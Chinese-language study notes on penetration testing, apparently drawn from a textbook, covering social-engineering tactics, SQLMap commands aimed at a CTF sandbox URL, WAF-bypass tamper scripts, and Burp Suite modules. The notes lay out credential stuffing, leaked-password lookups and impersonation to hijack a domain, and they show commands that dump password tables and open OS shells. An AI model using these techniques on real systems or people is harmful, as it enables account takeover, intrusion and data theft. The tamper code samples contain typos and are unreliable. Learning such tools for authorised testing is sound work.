<h3 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h3><p>社会工程学在渗透测试中起着不小的作用，利用社会工程学，攻击者可以从一<br>名员工的口中挖掘出本应该是秘密的信息。</p>
<p>假设攻击者对一家公司进行渗透测试，正在收集目标的真实IP阶段，此时就可以利用收集到的这家公司的某位销售人员的电子邮箱。首先，给这位销售人员发送邮件，假装对某个产品很感兴趣，显然销售人员会回复邮件。这样攻击者就可以通过分析邮件头来收集这家公司的真实IP地址及内部电子邮件服务器的相关信息。</p>
<p>通过进一步地应用社会工程学，假设现在已经收集了目标人物的邮箱、QQ、电话号码、姓名，以及域名服务商，也通过爆破或者撞库的方法获取邮箱的密码，这时就可以冒充目标人物要求客服人员协助重置域管理密码，甚至技术人员会帮着重置密码，从而使攻击者拿下域管理控制台，然后做域劫持。</p>
<p>除此以外，还可以利用“社工库”查询想要得到的信息，社工库是用社会工程学进行攻击时积累的各方数据的结构化数据库。这个数据库里有大量信息，甚至可以找到每个人的各种行为记录。利用收集到的邮箱，可以在社工库中找到已经泄露的密码，其实还可以通过搜索引擎搜索到社交账号等信息，然后通过利用社交和社会工程学得到的信息构造密码字典，对目标用户的邮箱和OA账号进行爆破或者撞库.</p>
<h2 id="常用的渗透测试工具"><a href="#常用的渗透测试工具" class="headerlink" title="常用的渗透测试工具"></a>常用的渗透测试工具</h2><h3 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h3><p>SQLMap是一个自动化的SQL注入工具，其主要功能是扫描、发现并利用给定URL的SQL注入漏洞，内置了很多绕过插件，支持的数据库是MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、sQLite、Firebird、Sybase和SAP MaxDB。SQLMap采用了以下5种独特的SQL注入技术。</p>
<ul>
<li>基于布尔类型的盲注，即可以根据返回页面判断条件真假的注入。</li>
<li>基于时间的盲注，即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已执行(即页面返回时间是否增加)来判断。</li>
<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中。</li>
<li>联合查询注入，在可以使用Union的情况下的注入。</li>
<li>堆查询注入，可以同时执行多条语句时的注入。</li>
</ul>
<p>SQLMap的强大的功能包括数据库指纹识别、数据库枚举、数据提取、访问目标文件系统，并在获取完全的操作权限时实行任意命令。SQLMap的功能强大到让人惊叹，当常规的注入工具不能利用SQL注入漏洞进行注入时，使用SQLMap会有意想不到的效果。</p>
<h4 id="SQLMap入门"><a href="#SQLMap入门" class="headerlink" title="SQLMap入门"></a>SQLMap入门</h4><h5 id="1-判断是否存在注入"><a href="#1-判断是否存在注入" class="headerlink" title="1.判断是否存在注入"></a>1.判断是否存在注入</h5><p>假设目标注入点是<a href="http://challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800/?id=1,判断其是否存在注入的命令如下所示">http://challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800/?id=1,判断其是否存在注入的命令如下所示</a>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210711143031706.png" alt=""></p>
<p>还有一种情况， 当注入点后面的参数大于等于两个时，需要加双引号，如下所<br>示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&amp;uid&#x3D;2&quot;</span><br></pre></td></tr></table></figure>
<p>可以看到，运行完判断是否存在注入的语句后，”爆出”一大段代码，下面来分析代码反馈给我们的信息。这里有三处需要选择的地方:第一处的意思为检测到数据库可能是MySQL,是否需要跳过检测其他数据库;第二处的意思是在”level1、risk1”的情况下，是否使用MySQL对应的所有Payload进行检测;第三处的意思是参数ID存在漏洞，是否要继续检测其他参数，一般默认按回车键即可，如下所示。</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210711143817878.png" alt=""></p>
<h5 id="2-判断文本中的请求是否存在注入"><a href="#2-判断文本中的请求是否存在注入" class="headerlink" title="2.判断文本中的请求是否存在注入"></a>2.判断文本中的请求是否存在注入</h5><p>从文件中加载HTTP请求，SQLMap可以从一个文本文件中获取HTTP请求，这样就可以不设置其他参数(如cookie、POST数据等)，txt文件中的内容为Web数据包。</p>
<p>判断是否存在注入的命令如下所示，-r一般在存在cookie注入时使用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r desktop&#x2F;1.txt</span><br></pre></td></tr></table></figure>
<h5 id="3-查询当前用户下的所有数据库"><a href="#3-查询当前用户下的所有数据库" class="headerlink" title="3.查询当前用户下的所有数据库"></a>3.查询当前用户下的所有数据库</h5><p>该命令是确定网站存在注入后，用于查询当前用户下的所有数据库。如果当前用户有权限读取包含所有数据库列表信息的表，使用该命令就可以列出所有数据库，如图3-7所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 --dbs</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210711145601887.png" alt=""></p>
<p>从下图中可以看到，查询出了4个数据库及所有数据库的库名。当继续注入时，—dbs缩写成-D xxx，其意思是在xxx数据库中继续查询其他数据。</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210711145728862.png" alt=""></p>
<h5 id="4-获取数据库中的表名"><a href="#4-获取数据库中的表名" class="headerlink" title="4.获取数据库中的表名"></a>4.获取数据库中的表名</h5><p>该命令的作用是查询完数据库后，查询指定数据库中所有的表名，如下所示。<br>如果在该命令中不加入-D参数来指定某一个具体的数据库，那么SQLMap会列出数据<br>库中所有库的表，如图3-8所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 -D sqli --tables</span><br></pre></td></tr></table></figure>
<p>当继续注入时，—tables缩写成-T，意思是在某表中继续查询。</p>
<h5 id="5-获取表中的字段名"><a href="#5-获取表中的字段名" class="headerlink" title="5.获取表中的字段名"></a>5.获取表中的字段名</h5><p>该命令的作用是查询完表名后，查询该表中所有的字段名。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&quot; -D sqli -T flag --columns</span><br></pre></td></tr></table></figure>
<p>在后续的注入中,—columns缩写成-C.</p>
<h5 id="6-获取字段内容"><a href="#6-获取字段内容" class="headerlink" title="6.获取字段内容"></a>6.获取字段内容</h5><p>该命令是查询完字段名之后，获取该字段中具体的数据信息，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&quot; -D sqli -T flag -C username,password --dump</span><br></pre></td></tr></table></figure>
<p>这里需要获取的数据是sqli数据库里flag表中username和password的值</p>
<h5 id="7-获取数据库的所有用户"><a href="#7-获取数据库的所有用户" class="headerlink" title="7.获取数据库的所有用户"></a>7.获取数据库的所有用户</h5><p>该命令的作用是列出数据库的所有用户，如下所示。在当前用户有权限读取包含所有用户的表的权限时，使用该命令就可以列出所有管理用户。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&quot; --users</span><br></pre></td></tr></table></figure>
<h5 id="8-获取数据库用户的密码"><a href="#8-获取数据库用户的密码" class="headerlink" title="8.获取数据库用户的密码"></a>8.获取数据库用户的密码</h5><p>该命令的作用是列出数据库用户的密码，如下所示。如果当前用户有读取包含用户密码的权限，SQLMap会先列举出用户，然后列出Hash,并尝试破解。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&quot; --passwords</span><br></pre></td></tr></table></figure>
<p>密码使用MD5加密，可以在<a href="http://www.cmd5.com中自行解密。">http://www.cmd5.com中自行解密。</a></p>
<h5 id="9-获取当前网站数据库的名称"><a href="#9-获取当前网站数据库的名称" class="headerlink" title="9.获取当前网站数据库的名称"></a>9.获取当前网站数据库的名称</h5><p>使用该命令可以列出当前网站使用的数据库，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&quot; --current-db</span><br></pre></td></tr></table></figure>
<h5 id="10-获取当前网站数据库的用户名称"><a href="#10-获取当前网站数据库的用户名称" class="headerlink" title="10.获取当前网站数据库的用户名称"></a>10.获取当前网站数据库的用户名称</h5><p>使用该命令可以列出当前网站使用的数据库用户，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&quot; --current-user</span><br></pre></td></tr></table></figure>
<h4 id="SQLMap进阶"><a href="#SQLMap进阶" class="headerlink" title="SQLMap进阶"></a>SQLMap进阶</h4><h5 id="1-—level-5-探测等级"><a href="#1-—level-5-探测等级" class="headerlink" title="1.—level 5:探测等级"></a>1.—level 5:探测等级</h5><p>参数—level 5指需要执行的测试等级，一共有5个等级(1~5)，可不加level,默认是1。SQLMap使用的Payload可以在xml/payloads.xml中看到，也可以根据相应的格式添加自己的Payload,其中5级包含的Payload最多，会自动破解出cookie、XFF等头部注入。当然，level 5的运行速度也比较慢。<br>这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP<br>cookie在level为2时就会测试，HTTP User Agent/Referer头在level为3时就会测试。<br>总之，在不确定哪个Payload或参数为注入点时，为了保证全面性，建议使用高的level值。</p>
<h5 id="2-—is-dba-当前用户是否为管理权限"><a href="#2-—is-dba-当前用户是否为管理权限" class="headerlink" title="2.—is-dba:当前用户是否为管理权限"></a>2.—is-dba:当前用户是否为管理权限</h5><p>该命令用于查看当前账户是否为数据库管理员账户，如下所示，在本案例中输入该命令，会返回Ture或False</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.1.7&#x2F;sql&#x2F;union.php?id&#x3D;1&quot; --is-dba</span><br></pre></td></tr></table></figure>
<h5 id="3-—roles-列出数据库管理员角色"><a href="#3-—roles-列出数据库管理员角色" class="headerlink" title="3.—roles:列出数据库管理员角色"></a>3.—roles:列出数据库管理员角色</h5><p>该命令用于查看数据库用户的角色。如果当前用户有权限读取包含所有用户的表，输入该命令会列举出每个用户的角色，也可以用-U参数指定想看哪个用户的角色。该命令仅适用于当前数据库是Oracle的时候</p>
<h5 id="4-—referer-HTTP-Referer头"><a href="#4-—referer-HTTP-Referer头" class="headerlink" title="4.—referer:HTTP Referer头"></a>4.—referer:HTTP Referer头</h5><p>SQLMap可以在请求中伪造HTTP中的referer,当—level参数设定为3或3以上时，会尝试对referer注入。可以使用referer命令来欺骗，如—referer <a href="http://www.baidu.com">http://www.baidu.com</a>.</p>
<h5 id="5-—sql-shell-运行自定义SQL语句"><a href="#5-—sql-shell-运行自定义SQL语句" class="headerlink" title="5.—sql-shell:运行自定义SQL语句"></a>5.—sql-shell:运行自定义SQL语句</h5><p>该命令用于执行指定的SQL语句，如下所示，假设执行select * from users<br>limit O,1语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.1.7&#x2F;sql&#x2F;union.php?id&#x3D;1&quot; --sq|-shell</span><br></pre></td></tr></table></figure>
<h5 id="6-—os-cmd-—os-shell-运行任意操作系统命令"><a href="#6-—os-cmd-—os-shell-运行任意操作系统命令" class="headerlink" title="6.—os-cmd,—os-shell:运行任意操作系统命令"></a>6.—os-cmd,—os-shell:运行任意操作系统命令</h5><p>在数据库为MySQL、PostgreSQL或Microsoft SQL Server,并且当前用户有权限使用特定的函数时，如果数据库为MySQL、PostgreSQL, SQLMap上传一个二进制库，包含用户自定义的函数sys_exec()和sys_eval()，那么创建的这两个函数就可以执行系统命令。在Microsoft SQL Server中，SQLMap将使用xp_cmdshell存储过程，如果被禁用(在Microsoft SQL Server 2005及以上版本默认被禁制)，则SQLMap会重新启用它;如果不存在，会自动创建。<br>用—os-shell参数可以模拟一个真实的Shell,输入想执行的命令。当不能执行多语句时(比如PHP或ASP的后端数据库为MySQL)，仍然可以使用INTO OUTFILE写进可写目录，创建一个Web后门。—os-shell支持ASP、ASP.NET、JSP和PHP四种语言(要想执行改参数，需要有数据库管理员权限，也就是—is-dba的值要为True)。</p>
<h5 id="7-—file-read-从数据库服务器中读取文件"><a href="#7-—file-read-从数据库服务器中读取文件" class="headerlink" title="7.—file-read:从数据库服务器中读取文件"></a>7.—file-read:从数据库服务器中读取文件</h5><p>该命令用于读取执行文件，当数据库为MySQL、PostgreSQL或Microsoft SQL Server,并且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。</p>
<h5 id="8-—file-write-—file-dest-上传文件到数据库服务器中"><a href="#8-—file-write-—file-dest-上传文件到数据库服务器中" class="headerlink" title="8.—file-write —file-dest:上传文件到数据库服务器中"></a>8.—file-write —file-dest:上传文件到数据库服务器中</h5><p>该命令用于写入本地文件到服务器中，当数据库为MySQL、PostgreSQL或Microsoft SQL Server,并且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。</p>
<h4 id="SQLMap自带绕过脚本tamper的讲解"><a href="#SQLMap自带绕过脚本tamper的讲解" class="headerlink" title="SQLMap自带绕过脚本tamper的讲解"></a>SQLMap自带绕过脚本tamper的讲解</h4><p>SQLMap在默认情况下除了使用CHAR()函数防止出现单引号，没有对注入的数据进行修改，读者还可以使用—tamper参数对数据做修改来绕过WAF等设备，其中大部分脚本主要用正则模块替换攻击载荷字符编码的方式尝试绕过WAF的检测规则，命令如下所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap XXXXX --tamper &quot;模块名&quot;</span><br></pre></td></tr></table></figure>
<p>下面是一个tamper脚本的格式:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sqlmap&#x2F;tamper&#x2F;esc apequotes.py</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">_priority_ &#x3D; PRIORITY.LOWEST</span><br><span class="line">def dependencies():</span><br><span class="line">	pass</span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">	return pay1oad.replace(&quot;&#39;&quot;,&quot;\\&#39;&quot;).replace(&#39;&quot;&#39;,&#39;\\&quot;&#39;)</span><br></pre></td></tr></table></figure>
<p>不难看出，一个最小的tamper脚本结构为priority变量定义和dependencies、tamper函数定义。</p>
<ul>
<li>priority定义脚本的优先级，用于有多个tamper脚本的情况。</li>
<li>dependencies函数声明该脚本适用/不适用的范围，可以为空。</li>
</ul>
<p>下面以一个转大写字符绕过的脚本为例，tamper绕过脚本主要由dependencies和tamper两个函数构成。def tamper(payload, **kwargs) 函数接收playload和**kwargs返回一个Payload。下面这段代码的意思是通过正则匹配所有字符，将所有攻击载荷中的字符转换为大写字母。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def tamper(pay1oad,**kwargs):</span><br><span class="line">	retval &#x3D; payload</span><br><span class="line">    if payload:</span><br><span class="line">    	for match in re.finditer(r&quot;[A-Za-z_]+&quot;,retVal):</span><br><span class="line">    		word &#x3D; match.group()</span><br><span class="line">            if word.upper() in kb.keywords:</span><br><span class="line">            retVal &#x3D; retVal.replace(word,word.upper())</span><br><span class="line">    return retval</span><br></pre></td></tr></table></figure>
<p>在日常使用中，我们会对一些网站是否有安全防护(WAF/IDS/IPS)进行试探，可以使用参数—identify-waf进行检测。</p>
<h3 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h3><p>Burp Suite代理工具是以拦截代理的方式，拦截所有通过代理的网络流量，如客户端的请求数据、服务器端的返回信息等。Burp Suite主要拦截HTTP和HTTPS协议的流量，通过拦截，Burp Suite以中间人的方式对客户端的请求数据、服务端的返回信息做各种处理，以达到安全测试的目的。</p>
<h4 id="Burp-Suite入门"><a href="#Burp-Suite入门" class="headerlink" title="Burp Suite入门"></a>Burp Suite入门</h4><p>在日常工作中，最常用的Web客户端就是Web浏览器，我们可以通过设置代理信息，拦截Web浏览器的流量,并对经过Burp Suite代理的流量数据进行处理。</p>
<p>Burp Suite运行后，Burp Proxy默认本地代理端口为8080</p>
<p><img src="https://i.loli.net/2021/05/16/mEcBXU3rwgNjDGo.png" alt=""></p>
<p>这里以Firefox浏览器为例，单击浏览器右上角”打开菜单”，依次单击”首选项”→”常规”→”网络设置”→”设置”→”手动配置代理”，设置HTTP代理为127.0.0.1,端口为8080,与Burp Proxy中的代理一致。</p>
<p><img src="https://i.loli.net/2021/05/16/LPQmOYiM9laxuNZ.png" alt=""></p>
<p><img src="https://i.loli.net/2021/05/16/gtxIL69c3DOPjiH.png" alt=""></p>
<p><img src="https://i.loli.net/2021/05/16/EgpWPxyozJOCbXk.png" alt=""></p>
<h5 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h5><p>Burp Proxy是利用Burp开展测试流程的核心，通过代理模式，可以让我们拦截、查看、修改所有在客户端与服务端之间传输的数据。</p>
<p><img src="https://i.loli.net/2021/05/16/12Q5rDLZIb6dVnv.png" alt=""></p>
<p>Burp Proxy的拦截功能主要由Intercept选项卡中的Forward、Drop、Interception is on/off和Action构成，它们的功能如下所示。</p>
<ul>
<li>Forward表示将拦截的数据包或修改后的数据包发送至服务器端。</li>
<li>Drop表示丢弃当前拦截的数据包。</li>
<li>Interception is on表示开启拦截功能，单击后变为Interception is off, 表示关闭拦截功能。</li>
<li>单击Action按钮，可以将数据包进一步发送到Spider、Scanner、Repeater、Intruder等功能组件做进一 步的测试，同时也包含改变数据包请求方式及其body的编码等功能。</li>
</ul>
<p>打开浏览器，输入需要访问的URL并按回车键，这时将看到数据流量经过Burp Proxy并暂停，直到单击Forward按钮，才会继续传输下去。如果单击了Drop按钮，这次通过的数据将丢失，不再继续处理。</p>
<p><img src="https://i.loli.net/2021/05/16/EbY7sNiQvn5lA6u.png" alt=""></p>
<p>当Burp Suite拦截的客户端和服务器交互之后，我们可以在Burp Suite的消息分析选项中查看这次请求的实体内容、消息头、请求参数等信息。Burp有四种消息类型显示数据包: Raw、Params、Headers和Hex。</p>
<ul>
<li>Raw主要显示Web请求的raw格式，以纯文本的形式显示数据包，包含请求地址、HTTP协议版本、主机头、浏览器信息、Accept可接受的内容类型、字符集、编码方式、cookie等，可以通过手动修改这些信息，对服务器端进行渗透测试。</li>
<li>Params主要显示客户端请求的参数信息，包括GET或者POST请求的参数、cookie参数。可以通过修改这些请求参数完成对服务器端的渗透测试。</li>
<li>Headers中显示的是数据包中的头信息，以名称、值的形式显示数据包。</li>
<li>Hex对应的是Raw中信息的二进制内容，可以通过Hex编辑器对请求的内容进行修改，在进行00截断时非常好用。</li>
</ul>
<h5 id="Spider"><a href="#Spider" class="headerlink" title="Spider"></a>Spider</h5><p>Spider的蜘蛛爬行功能可以帮助我们了解系统的结构，其中Spider爬取到的内容将在Target中展示，界面左侧为一个主机和目录树，选择具体某一个分支即可查看对应的请求与响应。</p>
<h5 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h5><p>Decoder的功能比较简单，它是Burp中自带的编码解码及散列转换的工具，能对原始数据进行各种编码格式和散列的转换。</p>
<p>Decoder的界面如图3-25所示。输入域显示的是需要编码/解码的原始数据，此处可以直接填写或粘贴，也可以通过其他Burp工具上下文菜单中的”Send to Decoder”选项发送过来;输出域显示的是对输入域中原始数据进行编码/解码的结果。无论是输入域还是输出域都支持文本和Hex这两种格式，编码解码选项由解码选项(Decode as)、编码选项 (Encode as)、散列 (Hash)构成。在实际使用时，可<br>以根据场景的需要进行设置。 </p>
<p><img src="https://i.loli.net/2021/05/16/8tx7sZk9n5RJrvV.png" alt=""></p>
<h4 id="Burp-Suite进阶"><a href="#Burp-Suite进阶" class="headerlink" title="Burp Suite进阶"></a>Burp Suite进阶</h4><h5 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h5><p>Burp Scanner主要用于自动检测Web系统的各种漏洞。此处介绍Burp<br>Scanner的基本使用方法，在实际使用中可能会有所改变，但大体环节如下。首先，确认Burp Suite正常启动并完成浏览器代理的配置。然后进入Burp<br>Proxy,关闭代理拦截功能，快速浏览需要扫描的域或URL模块，此时在默认情况下，Burp Scanner会扫描通过代理服务的请求，并对请求的消息进行分析来辨别是否存在系统漏洞。而且当我们打开Burp Target时，也会在站点地图中显示请求的URL树。</p>
<p>我们随便找一个网站进行测试，选择Burp Target的站点地图选项下的链接，在其链接URL上右击选择”Actively scan this host”</p>
<p><img src="https://i.loli.net/2021/05/16/t9esV3JIkX6LbHx.png" alt=""></p>
<p>此时会弹出过滤设置，保持默认选项即可扫描整个域</p>
<p><img src="https://i.loli.net/2021/05/16/XGtoPSdup8I2D19.png" alt=""></p>
<p><img src="https://i.loli.net/2021/05/16/MsniFYa9w6fgpHo.png" alt=""></p>
<p>也可以在Proxy下的HTTP history中，选择某个节点上的链接URL并右击选择Do an active scan进行扫描</p>
<p><img src="https://i.loli.net/2021/05/16/yY9CNxk6QO8nlEM.png" alt=""></p>
<p>这时，Burp Scanner开始扫描，在Scanner界面下双击即可看到扫描结果</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210516120022385.png" alt=""></p>
<p>我们也可以在扫描结果中选中需要进行分析的部分，将其发送到repeater模块<br>中进行模拟提交分析和验证</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210516120134680.png" alt=""></p>
<p>当scanner扫描完成后，可以右击Burp Target站点地图选项下的链接，依次选择”issues” “Report issues”选项，然后导出漏洞报告.</p>
<p>Burp Scanner主要有主动扫描和被动扫描两种扫描方式:</p>
<h6 id="1-主动扫描-Active-Scanning"><a href="#1-主动扫描-Active-Scanning" class="headerlink" title="1.主动扫描(Active Scanning)"></a>1.主动扫描(Active Scanning)</h6><p>当使用主动扫描模式时，Burp会向应用发送新的请求并通过Payload验证漏洞。这种模式下的操作会产生大量的请求和应答数据，直接影响服务端的性能，通常用于非生产环境。主动扫描适用于以下这两类漏洞。</p>
<ul>
<li>客户端的漏洞，如XSS、HTTP头注入、操作重定向。</li>
<li>服务端的漏洞，如SQL注入、命令行注入、文件遍历。</li>
</ul>
<p>对第一类漏洞，Burp在检测时会提交input域，然后根据应答的数据进行解析。在检测过程中，Burp会对基础的请求信息进行修改，即根据漏洞的特征对参数进行修改，模拟人的行为，以达到检测漏洞的目的;对第二类漏洞，以SQL注入为例，服务端有可能返回数据库错误提示信息，也有可能什么都不反馈。Burp在检测过程中会采用各个技术验证漏洞是否存在，例如诱导时间延迟、强制修改Boolean值、与模糊测试的结果进行比较，以提高漏洞扫描报告的准确性。</p>
<h6 id="2-被动扫描-Passive-Scanning"><a href="#2-被动扫描-Passive-Scanning" class="headerlink" title="2.被动扫描(Passive Scanning)"></a>2.被动扫描(Passive Scanning)</h6><p>当使用被动扫描模式时，Burp不会重新发送新的请求，只是对已经存在的请求和应答进行分析，对服务端的检测来说，这比较安全，通常适用于生产环境的检测。一般来说，下列漏洞在被动模式中容易被检测出来。</p>
<ul>
<li>提交的密码为未加密的明文。</li>
<li>不安全的cookie的属性，例如缺少HttpOnly和安全标志。</li>
<li>cookie的范围缺失。</li>
<li>跨域脚本包含和站点引用泄露。</li>
<li>表单值自动填充，尤其是密码。</li>
<li>SSL保护的内容缓存。</li>
<li>目录列表。</li>
<li>提交密码后应答延迟。</li>
<li>session令牌的不安全传输。</li>
<li>敏感信息泄露，例如内部IP地址、电子邮件地址、堆栈跟踪等信息泄露。</li>
<li>不安全的ViewState的配置。</li>
<li>错误或不规范的Content-Type指令。</li>
</ul>
<p>虽然被动扫描模式相比主动模式有很多不足，但同时也具有主动模式不具备的优点。除了对服务端的检测比较安全,当某种业务场景的测试每次都会破坏业务场景的某方面功能时，可以使用被动扫描模式验证是否存在漏洞，以减少测试的风险。</p>
<h5 id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h5><p>Intruder是一个定制的高度可配置的工具，可以对Web应用程序进行自动化攻击，如通过标识符枚举用户名、ID和账户号码，模糊测试，SQL注入，跨站，目录遍历<br>等。<br>它的工作原理是Intruder在原始请求数据的基础上，通过修改各种请求参数获取不同的请求应答。在每一次请求中，Intruder通常会携带一个或多个有效攻击载荷(Payload)，在不同的位置进行攻击重放，通过应答数据的比对分析获得需要的特征数据。Burp Intruder通常被应用于以下场景。</p>
<ul>
<li>标识符枚举。Web应用程序经常使用标识符引用用户、账户、资产等数据信息。例如，用户名、文件ID和账户号码。</li>
<li>提取有用的数据。在某些场景下，不是简单地识别有效标识符，而是通过简单标识符提取其他数据。例如，通过用户的个人空间ID获取所有用户在其个人空间的名字和年龄。</li>
<li>模糊测试。很多输入型的漏洞(如SQL注入、跨站点脚本和文件路径遍历)可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。受限于应用程序的大小和复杂性，手动执行这个测试是一个耗时且烦琐的过程，因此可以设置Payload,通过Burp Intruder自动化地对Web应用程序进行模糊测试</li>
</ul>
<p>Intruder攻击模式:</p>
<ul>
<li>Sniper模式使用单一的Payload组。它会针对每个位置设置Payload.这种攻击类型适用于对常见漏洞中的请求参数单独进行Fuzzing测试的情景。攻击中的请求总数应该是position数量和Payload数量的乘积。</li>
<li>Battering ram模式使用单一的Payload组。它会重复Payload并一次性把所有相同的Payload放入指定的位置中。这种攻击适用于需要在请求中把相同的输入放到多个位置的情景。请求的总数是Payload组中Payload的总数。</li>
<li>Pitchfork模式使用多个Payload组。攻击会同步迭代所有的Payload组，把Payload放入每个定义的位置中。这种攻击类型非常适合在不同位置中需要插入不同但相似输入的情况。请求的数量应该是最小的Payload组中的Payload数量。</li>
<li>Cluster bomb模式会使用多个Payload组。每个定义的位置中有不同的Payload组。攻击会迭代每个Payload组，每种Payload组合都会被测试一遍。这种攻击适用于在位置中需要不同且不相关或者未知输入攻击的情景。攻击请求的总数是各Payload组中Payload数量的乘积。</li>
</ul>
<h5 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h5><p>Burp Repeater是一个手动修改、补发个别HTTP请求，并分析它们的响应的工具。它最大的用途就是能和其他Burp Suite工具结合起来使用。可以将目标站点地图、Burp Proxy浏览记录、Burp Intruder的攻击结果，发送到Repeater上，并手动调整这个请求来对漏洞的探测或攻击进行微调。</p>
<p>Repeater分析选项有4种: Raw、Params、Headers和Hex。</p>
<ul>
<li>Raw:显示纯文本格式的消息。在文本面板的底部有一个搜索和加亮的功能，可以用来快速定位需要寻找的字符串，如出错消息。利用搜索栏左边的弹出项，能控制状况的灵敏度，以及是否使用简单文本或十六进制进行搜索。</li>
<li>Params:对于包含参数(URL查询字符串、cookie头或者消息体)的请求，Params选项会把这些参数显示为名字/值的格式，这样就可以简单地对它们进行查看和修改了。</li>
<li>Headers:将以名字/值的格式显示HTTP的消息头，并且以原始格式显示消息</li>
<li>Hex:允许直接编辑由原始二进制数据组成的消息。</li>
</ul>
<p>在渗透测试过程中,我们经常使用Repeater进行请求与响应的消息验证分析，例如修改请求参数、验证输入的漏洞;修改请求参数、验证逻辑越权;从拦截历史记录中，捕获特征性的请求消息进行请求重放。</p>
<h5 id="Comparer"><a href="#Comparer" class="headerlink" title="Comparer"></a>Comparer</h5><p>Burp Comparer在Burp Suite中主要提供一个可视化的差异比对功能，来对比分析两次数据之间的区别，使用到的场合有:</p>
<ul>
<li>枚举用户名的过程中，对比分析登录成功和失败时，服务端反馈结果的区别。</li>
<li>使用Intruder进行攻击时，对于不同的服务端响应，可以很快分析出两次响应的区别在哪里。</li>
<li>进行SQL注入的盲注测试时，比较两次响应消息的差异，判断响应结果与注入条件的关联关系。</li>
</ul>
<p>使用Comparer时有两个步骤，先是数据加载，然后是差异分析。</p>
<p>Comparer数据加载的常用方式如下所示。</p>
<ul>
<li>从其他Burp工具通过上下文菜单转发过来。</li>
<li>直接粘贴。</li>
<li>从文件里加载。</li>
</ul>
<p>加载完毕后，如果选择两次不同的请求或应答消息，则下发的比较按钮将被激活，此时可以选择文本比较或字节比较。</p>
<h5 id="Sequencer"><a href="#Sequencer" class="headerlink" title="Sequencer"></a>Sequencer</h5><p>Burp Sequencer是一种用于分析数据样本随机性质量的工具。可以用它测试应用程序的会话令牌(Session token)、密码重置令牌是否可预测等场景，通过Sequencer的数据样本分析，能很好地降低这些关键数据被伪造的风险。</p>
<p>Burp Sequencer主要由信息截取(Live Capture)、手动加载 (Manual Load)和选项分析(Analysis Options)三个模块组成。</p>
<p>在截取信息后，单击Load按钮加载信息，然后单击”Analyze now”按钮进行分析。</p>
